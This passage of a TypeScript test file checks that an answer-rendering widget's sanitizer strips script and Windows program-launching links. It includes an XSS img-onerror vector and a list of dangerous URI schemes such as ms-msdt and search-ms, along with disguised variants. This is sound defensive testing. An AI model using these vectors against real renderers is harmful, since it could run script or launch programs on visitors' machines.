  // A MathML token holds text only: an HTML tag in it ends the formula.
  [
    '<math><annotation-xml encoding="text/html"><img src="x" onerror="alert(1)"></annotation-xml><mi><b>z</b></mi></math>',
    "<p><math><mi></mi></math><b>z</b></p>",
  ],
];

test("widget: script stays out of an answer in both modes, and nothing leaves a drawing", () => {
  for (const [input, expected] of SCRIPT_VECTORS) {
    assert.equal(renderWidget(input), expected, input);
    assertInert(renderWidget(input), input);
    assertInert(renderStrict(input), input, true);
  }
});

// An answer shown on a third-party site must not hand the visitor a link that
// launches a Windows program (PROGRAM_SCHEMES): default rendering drops it and
// keeps its text, exactly as it drops a script link; strict rendering already
// did. One target per scheme, in the shape its handler takes; none holds
// "https://", which the widget's Markdown pass would autolink.
const PROGRAM_LINKS = [
  "hcp://system/sysinfo/sysinfomain.htm",
  "its:x.chm::/x.htm",
  "mhtml:file.mht!x.htm",
  "mk:@MSITStore:x.chm::/x.htm",
  "ms-appinstaller:?source=x",
  "ms-cxh:localonly",
  "ms-cxh-full://0",
  "ms-its:x.chm::/x.htm",
  "ms-itss:x.chm::/x.htm",
  "ms-msdt:/id PCWDiagnostic /skip force",
  "ms-officecmd:x",
  "search:query=x",
  "search-ms:query=x",
  "shell:startup",
];
// Read the way the script-scheme check reads a scheme: any case, leading
// whitespace and controls, a tab inside the name.
const PROGRAM_LINK_DISGUISES = ["MS-MSDT:x", "Search-MS:x", " ms-msdt:x", "\u0001search-ms:x", "sh\tell:startup", "SHELL:x"];
// The widget also decodes character references: its Markdown pass leaves a
// target's "&" as written, and the browser would decode "&#x2d;" to "-".
const PROGRAM_LINK_REFERENCES = ["ms&#x2d;msdt:x", "&#x6d;s-msdt:x", "search&#x09;-ms:x"];

test("widget: by default a link that launches a Windows program keeps its text and loses its target", () => {
  for (const url of [...PROGRAM_LINKS, ...PROGRAM_LINK_DISGUISES, ...PROGRAM_LINK_REFERENCES]) {
    assert.equal(renderWidget(`[open](${url})`), `<p><a ${NEW_TAB}>open</a></p>`, url);
    assert.equal(renderWidget(`<a href="${url}">open</a>`), "<p><a>open</a></p>", url);
  }
});

test("widget: strict rendering refuses a Windows program link too, as it already did", () => {
  for (const url of [...PROGRAM_LINKS, ...PROGRAM_LINK_DISGUISES, ...PROGRAM_LINK_REFERENCES]) {
    assert.equal(renderStrict(`[open](${url})`), `<p><a ${NEW_TAB}>open</a></p>`, url);
    assert.equal(renderStrict(`<a href="${url}">open</a>`), `<p><a ${NEW_TAB}>open</a></p>`, url);
  }
});

// The widget has no module system, so it holds its own copy of the list: it,
// and the cases above, name exactly PROGRAM_SCHEMES.
test("the widget refuses exactly the Windows program schemes listed here", () => {
  const listed = (source: string) => /^\^\(\?:([a-z|-]+)\)\$$/.exec(source)?.[1].split("|").sort();
  const expected = [...PROGRAM_SCHEMES].sort();
  const widget = WIDGET_CORE.PROGRAM_SCHEMES as RegExp | undefined;
  assert.ok(widget, "widget.js has lost its PROGRAM_SCHEMES list");
  assert.equal(widget.flags, "i");
  assert.deepEqual(listed(widget.source), expected);
  assert.deepEqual(PROGRAM_LINKS.map((url) => url.slice(0, url.indexOf(":"))).sort(), expected);
});

// Links an answer legitimately carries: web, mail and phone links, application
// and communication schemes, and the Office URI schemes that open a SharePoint
// document in its desktop app. They keep linking in default rendering, exactly
// as before.
const KEPT_LINKS = [
  "https://ok.example/a?b=1",
  "http://ok.example/a",
  "slack://open?team=T123",
  "msteams:/l/chat/0/0?users=a@example.com",
  "zoommtg://zoom.us/join?confno=1",
  "vscode://file/x",
  "notion://x",
  "figma://x",
  "obsidian://open?vault=x",
  "sip:alice@example.com",
  "sms:+33123456789",
  "webcal://calendar.example/team.ics",
  "ftp://files.example/report.pdf",
  "mailto:team@example.com",
  "tel:+33123456789",
  "ms-word:x",
  "ms-excel:x",
  "ms-powerpoint:x",
  "ms-outlook:x",
  "ms-visio:x",
  "ms-access:x",
];

test("widget: by default a web, app or Office link still links, as before", () => {
  for (const url of KEPT_LINKS) {
    assert.equal(renderWidget(`<a href="${url}">x</a>`), `<p><a href="${url}">x</a></p>`, url);
    assert.equal(renderWidget(`[x](${url})`), `<p><a href="${url}" ${NEW_TAB}>x</a></p>`, url);
  }
});

